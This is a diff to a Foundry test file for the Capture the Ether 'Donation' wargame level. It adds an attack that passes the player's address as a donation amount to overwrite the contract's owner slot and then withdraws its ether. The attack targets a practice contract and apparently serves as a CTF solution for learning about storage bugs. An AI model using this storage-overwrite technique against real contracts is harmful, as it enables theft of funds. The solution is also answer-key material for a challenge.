@@ -20,7 +20,6 @@ contract DonationTest is Test {
          *************** */
         DonationChallenge donation = new DonationChallenge{value: 1 ether}();
         vm.startPrank(player);
-        address levelAddress = address(donation);
         uint256 initialPlayerBalance = player.balance;
         assertEq(initialPlayerBalance, 5 ether);
         assertEq((address(donation)).balance, 1 ether);
@@ -28,6 +27,12 @@ contract DonationTest is Test {
          *    Attack     *
          *************** */
 
+        uint256 scale = 10 ** 18 * 1 ether;
+        console.log(donation.owner());
+        uint256 etherAmount = uint256(uint160(address(player)));
+        donation.donate{value: etherAmount / scale}(etherAmount);
+        console.log(donation.owner());
+        donation.withdraw();
         /*****************
          *Level Submission*
          ***************  */
